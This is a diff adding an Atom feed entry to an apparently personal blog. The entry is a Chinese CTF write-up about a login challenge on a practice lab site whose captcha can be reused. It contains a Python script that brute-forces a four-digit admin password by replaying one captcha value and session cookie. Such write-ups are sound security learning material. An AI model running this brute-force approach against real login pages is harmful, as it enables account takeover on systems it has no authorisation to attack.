@@ -125,6 +125,33 @@
   </entry>
   
   <entry>
+    <title>CTF-验证码</title>
+    <link href="https://wuzeqin99.github.io/2019/12/26/CTF-%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
+    <id>https://wuzeqin99.github.io/2019/12/26/CTF-%E9%AA%8C%E8%AF%81%E7%A0%81/</id>
+    <published>2019-12-26T10:14:44.000Z</published>
+    <updated>2019-12-26T12:43:31.027Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" target="_blank" rel="noopener">题目</a></p><p>思路：1.看验证码是否可以重复使用2.可用burpsuit爆破或者保持会话脚本访问</p><p>这道题目的验证码是可以重复使用的，具体：输入一个错误的pwd和一个正确的vcode时，<br>网页跳转到 pwd error 的一个页面 而当vcode也错时 跳入 vcode error 的页面<br>用burpsuite的repeater功能在一个pwd error 页面重复提交不同的pwd 发现只会出现pwd error的错误<br>说明验证码是可以重复使用的</p><p>用python</p><pre><code>import requestsimport reurl = &quot;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&quot;s=requests.session()head={&#39;cookie&#39;:&#39;PHPSESSID=f1c199bba2f35d61403985134f6eddaf&#39;}n=1for i in range(1000,10000):    data={&#39;username&#39;:&#39;admin&#39;,&#39;pwd&#39;:i,&#39;vcode&#39;:&#39;npcq&#39;,&#39;submit&#39;:&#39;submit&#39;}    html=s.post(url,data=data,headers=head)    html.encoding=&#39;utf-8&#39;    res=html.content.decode(&#39;utf-8&#39;)    if u&#39;vcode error&#39; in res:        print(&#39;vcode error&#39;)        break    if u&#39;pwd error&#39; in res:        print(&#39;正在破解……&#39;)    if u&#39;error&#39; not in res:        print(i,&#39;--正确的pwd&#39;)        print(res)        break</code></pre><p><strong>注意</strong> 这里的url是已经跳转到pwd error的url 这样才能保证vcode的正确</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;思路：1.看验证
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="https://wuzeqin99.github.io/categories/CTF/"/>
+    
+    
+      <category term="CTF" scheme="https://wuzeqin99.github.io/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
     <title>一道简单的ACM</title>
     <link href="https://wuzeqin99.github.io/2019/12/20/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95ACM/"/>
     <id>https://wuzeqin99.github.io/2019/12/20/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95ACM/</id>
